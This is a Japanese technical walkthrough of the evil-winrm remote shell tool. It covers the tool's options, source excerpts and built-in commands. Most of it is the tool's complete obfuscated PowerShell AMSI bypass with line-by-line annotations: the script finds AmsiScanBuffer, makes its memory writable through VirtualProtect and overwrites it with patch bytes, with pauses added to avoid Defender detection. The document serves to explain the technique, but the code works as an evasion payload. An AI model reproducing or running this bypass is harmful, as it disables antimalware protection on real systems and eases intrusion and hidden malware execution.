## -h
```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```


## -S
HTTPS用のポートは5986番ポートを使用する（デフォルトのHTTPは5985番）  
WinRMでHTTPSの設定がされていないと、このオプションは使用できない。  
https://learn.microsoft.com/ja-jp/troubleshoot/windows-client/system-management-components/configure-winrm-for-https
```ruby
opts.on('-S', '--ssl', 'Enable ssl') do |_val|
    $ssl = true
    options[:port] = '5986'
```

## -U
デフォルトは「POST /wsman」HTTPを使用してWinRMを行う。デフォルト設定のままだと、wsman以外のURLではWinRMを使用できない


## [-N](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L177)
リモート上でのタブ補完を無効にする  
※現時点で、KaliのRubyの「Readline.quoting_detection_proc」は実装されていなのでタブ補完は機能していない

## -l
自動でログファイルが作成され、$loggerを使用してログ出力している  
実行コマンド、コマンド結果もログ出力されている
```ruby
$filepath = "#{$full_logging_path}/#{Time.now.strftime('%Y%d%m')}/#{$host}/#{Time.now.strftime('%H%M%S')}"
$logger = Logger.new($filepath)
```


# command
## [menu](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L836)
使用可能なevil-winrm独自のコマンドを確認できる
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```


## Bypass-4MSI
「Bypass-4MSI」を実行すると、使用できるコマンドが増える
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
                                        
Warning: AV could be still watching for suspicious activity. Waiting for patching...
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!
*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
                                        
Info: Bypass-4MSI is loaded. Trying to load utilities


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```
AMSIをバイバスるるためにPowershellが実行される  
このPowershellは、evil-winrmのコード上では難読化されている
ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、「#jamp」コードで２秒待機するようになっている
```powershell
FUncTIon Get-PZ2zmpurexnDXVSxx {
    Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)

# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされているかどうか「Equals」メソッドで確認
# ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「GetType」メソッドで確認
    $IObr8mVbBcalgmD = ([AppDomain]::CurrentDomain.GetAssemblies() |
    WheRe-ObJecT { 
        $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
     }).GetType("Microsoft."+[cHar]([BYTE] 0xae-0x57)+[cHaR](5622-5517)+[ChaR](8858-8748)+[chaR]([byTe] 0x56-0x23)+[chAR](1248-1198)+[ChaR](877-831)+[CHAR](4158-4073)+[ChaR](4512-4402)+"safeNativeMethods")

# 「GetMethods()」メソッドでsystem.dllの「GetProcAddress」を取得
    $IqnMnVucT=@()
    $IObr8mVbBcalgmD.GetMethods() | FOrEaCH-ObJEct {
        If($_.Name -LiKe "Ge*P*oc*"+[char](8884-8784)+[cHaR](6481-6381)+[cHAr](4918-4804)+[chAr]([bYTe] 0xc7-0x62)+[cHAR](859-744)+"s") {
            $IqnMnVucT+=$_
        }
    }

#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,引数DLL名)」を実行し引数DLLのハンドルを取得
# System.dllの「GetProcAddress」で、引数DLLの引数プロセス名のアドレスを取得
    return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))

}
#jump

FUncTIon Get-iy2kysa7yS {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jqr21eiEq5PCPuo, [Parameter(Position = 1)] [Type] $zjYqpHs8RLAoDPo = [Void]
    )

# [AppDomain]::CurrentDomain.DefineDynamicAssemblyで「動的アセンブリの一意のID」と「アクセスモード」を指定して、動的アセンブリを定義
# 動的アセンブリの一意のIDは、[System.Reflection.AssemblyName]で「ReflectedDelegate」という名前を指定
# アクセスモードは、[System.Reflection.Emit.AssemblyBuilderAccess]::Runを指定（Runは動的アセンブリは実行されるが保存されない）
# [AppDomain]::CurrentDomain.DefineDynamicAssemblyの戻り値は「System.Reflection.Emit.AssemblyBuilder」クラス
# AssemblyBuilderクラスの「DefineDynamicModule」メソッドで、「動的モジュールの名前」と「シンボル情報出力の有無」を指定
# 動的モジュールの名前は「InMemoryModule」を、シンボル情報出力の有無は「false」を指定
# AssemblyBuilder.DefineDynamicModule()メソッドの戻り値は、「System.Reflection.Emit.ModuleBuilder」クラス
# ModuleBuilderクラスの「DefineType」メソッドで「MyDelegateType」という名前を指定
    $WQvsFMfB0c = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object SYSTEM.REFLECtiOn.AsSembLYNaME(""+[cHaR](3975-3893)+[chaR](6333-6232)+[cHAR](6160-6058)+"lec"+[chAR](9375-9259)+[Char](6379-6278)+[cHaR](340-240)+[CHAR](6723-6655)+[cHAr](5669-5568)+"legate")),
        [SYsTEM.ReflEctIoN.EMit.ASSemBlYBuiLDERACCeSs]::Run
    ).DEfINEDYnAMiCMODUle(
        ""+[Char](5533-5460)+[cHAR]([byTE] 0xb1-0x43)+[chaR](5985-5908)+"emo"+[Char](467-353)+[cHAr]([BYTE] 0xd8-0x5f)+"Module",
        $false
    ).DefineType(
        $(""+[ChAr]([ByTe] 0x82-0x35)+[CHaR](7019-6898)+[cHar](8273-8205)+[Char](5350-5249)+[ChAr](4707-4599)+[cHAr]([BytE] 0xca-0x65)+[ChaR](9729-9626)+[CHar](686-589)+[chAr]([BYtE] 0x9c-0x28)+[chaR](936-835)+[cHAr]([bYte] 0x89-0x35)+[cHaR](3845-3724)+[Char]([ByTE] 0xd9-0x69)+[chAr](7417-7316)+""),
        "Class, Public, Sealed, AnsiClass, AutoClass",
        [SyStem.MUlTicaSTDeLEgate]
    )

    $WQvsFMfB0c.DefiNeCONstRUcToR(
        "RTSpecialName, HideBySig, Public",
        [SYSTem.REfLectiON.CAlLINgCoNVeNtIOnS]::Standard, $jqr21eiEq5PCPuo
    ).SetImplementationFlags("Runtime, Managed")

    $WQvsFMfB0c.DeFINeMeTHod(
        "Invoke",
        "Public, HideBySig, NewSlot, Virtual",
        $zjYqpHs8RLAoDPo,
        $jqr21eiEq5PCPuo
    ).SetImplementationFlags("Runtime, Managed")

# System.Reflection.Emit.ModuleBuilder.DefineType()メソッドの戻り値は「System.Reflection.Emit.TypeBuilder」クラス
# TypeBuilderクラスのCreateType()メソッドで、オブジェクトを作成
    return $WQvsFMfB0c.CreateTYpe()
}

#jump
# 「Get-PZ2zmpurexnDXVSxx $amsi.dll $AmsiScanBuffer」を実行し、「AmsiScanBuffer」プロセスのアドレスを取得
[IntPtr]$jdemwXeK2wnWhB = Get-PZ2zmpurexnDXVSxx $(""+[char](2099-2002)+[ChAr](5453-5344)+[CHar]([bytE] 0xb5-0x42)+[Char]([Byte] 0xdf-0x76)+[chAr]([BYTE] 0x4d-0x1f)+[chAR](2502-2402)+[chAR](749-641)+[cHar]([BytE] 0x91-0x25)+"") $(""+[ChAr](3160-3095)+[cHaR]([BYtE] 0xdc-0x6f)+[cHar](6716-6601)+[chAR]([ByTe] 0xdf-0x76)+[Char](7170-7087)+[ChAr]([BYtE] 0xd5-0x72)+[cHAR](6847-6750)+[chaR](2526-2416)+[cHAr](3598-3532)+[char](7822-7705)+[ChAr](377-275)+[cHar](3259-3157)+[chaR](7660-7559)+[cHar](4473-4359)+"")
#jump
$N7IBEcG01XRRln = 0
#jump
# 「Get-PZ2zmpurexnDXVSxx $kernel32.dll  VirtualProtect」でk「VirtualProtect」プロセスのアドレスを取得
# 「Get-iy2kysa7yS」で動的アセンブリを作成
# System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer()メソッドでアンマネージ関数ポインターをデリゲートに変換する。
$knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTeR(
    (Get-PZ2zmpurexnDXVSxx $(""+[ChAR](577-470)+[ChaR](2547-2446)+[cHar](5679-5565)+[chAr](6260-6150)+[cHAr](4851-4750)+[ChAr](3338-3230)+[char](9887-9836)+[Char]([bYTe] 0x77-0x45)+[CHAR](4271-4225)+[cHar](7885-7785)+[cHAR]([bytE] 0xdc-0x70)+[ChAR](1500-1392)+"") VirtualProtect), 
    (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
)
#jump
# VirtualProtectをInvokeで実行して、AmsiScanBufferのアクセス保護属性を「0x40(PAGE_EXECUTE_READWRITE)」に変更
$UQXThoSh2exMyo = $knBIRuLz.Invoke($jdemwXeK2wnWhB, 3, 0x40, [ref]$N7IBEcG01XRRln)
#jump
$hpBlHjUMs = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
#jump
# System.Runtime.InteropServices.Marshal.Copy()メソッドを使用して、マネージド配列のデータをアンマネージド メモリ ポインター(AmsiScanBuffer)にコピーする
# 要するに、AmsiScanBufferのプロセスが上書きされる
$UQXThoSh2exMyo = [SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::Copy($hpBlHjUMs, 0, $jdemwXeK2wnWhB, 12)
#jump
Remove-Item Function:Get-iy2kysa7yS
#jump
```
